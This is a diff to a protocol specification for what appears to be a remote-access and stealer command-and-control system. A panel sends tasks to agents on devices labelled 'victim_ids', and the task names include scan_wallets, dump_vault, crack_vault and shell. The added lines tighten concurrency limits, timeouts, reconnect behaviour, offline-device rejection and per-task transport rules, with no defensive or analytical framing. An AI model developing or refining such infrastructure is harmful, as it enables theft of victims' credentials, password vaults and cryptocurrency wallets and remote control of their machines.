@@ -161,10 +161,29 @@ defaults `30000`, max `300000`. Requires ACK before execution.
 - 4 in flight max (ACKed, no result yet). The fifth is ACKed and **after the ACK**
   answered with `result` `body {status:"error", error:"busy", result:{}, artifacts:[]}`.
   No queue, no silent drop.
+- The **agent owns the four-in-flight limit**. The panel sends every `cmd` and only
+  counts in-flight for the UI and the handshake flush; it has no local gate, so the
+  fifth always reaches the agent and gets `busy`.
 - `timeout_ms` is a hard deadline from the ACK on both ends. Agent cancels locally and
   emits `result` `body {status:"error", error:"timeout", ...}`; panel waits 5 s more and
-  drops later results for that `reply_to`.
+  drops later results for that `reply_to`. The discard window is in memory only; the
+  durable dedup is the task id plus terminal state in Postgres, so a late result after
+  a restart is rejected by the task row.
+- `agent {command:"reconnect"}` sends `bye {code:1000, reason:"reconnect"}` and
+  then a Close `1000` once its `result` is ACKed, with a 2 s cap that uses the same
+  bye + Close. `1000` is a normal close, not a bare/dry one; the agent reconnects
+  with normal backoff. If no result arrives in the deadline, the panel closes that
+  task as `unknown`, not `timeout`.
 - Legacy `task <name> <base64url-json>` stays accepted by the agent parser.
+- **No offline queue.** A due task for a device without a ready socket is rejected
+  at the edge with `409 agent_offline` and `victim_ids`; nothing old runs blind on
+  the next hello. Only a scheduled task (`not_before`) stays queued; its FIFO, cap,
+  TTL and `expired` rule live in `openapi.yaml` under `/tasks`.
+- `agent` is its own type: its `command` runs the agent-console allowlist only and
+  never falls back to the OS shell. `agent {command:"shell whoami"}` is an allowlist
+  error (the output says `allowlist: unknown agent command: shell`), not shell
+  output. `agent {command:"reconnect"}` restarts only the Discord gateway and
+  answers in one line.
 
 ### `result` (agent → panel)
 
@@ -174,6 +193,10 @@ literal of `CryptoModule.java:1426-1441` (UTF-8 bytes, no reserialization):
 
 - `status`: `ok|error|cancelled`; `error` nullable; `result` object; `artifacts` =
   `[{"upload_request":uuid}]`.
+- `error:"timeout"` carries `result:{}` and `artifacts:[]`. Consumers inspect
+  `status`/`error` before touching `result`; an empty result is not a success.
+- A task closed as `unknown` is terminal too and is never leased again by
+  `GET /tasks`.
 - The panel closes the task on receipt.
 - The shape does **not** carry `ok`; use `status`.
 - `http_only` tasks (§5) always POST the body and send
@@ -222,7 +245,10 @@ These task names **always** deliver the real result through
 `scan_wallets, dump_vault, crack_vault, shell, agent`
 
 The rest may use the frame. All names remain in the `cmd` schema with `$ref` to
-`task-schemas.json`.
+`task-schemas.json`. Each type carries `transport: "http"` or `transport: "frame"`
+there; a missing `transport` means `frame`, and the panel rejects the name at the
+edge if the field is absent or unknown. The panel rejects any name outside the
+eleven before dispatch.
 
 ## 6. Delivery, retry, closure
 
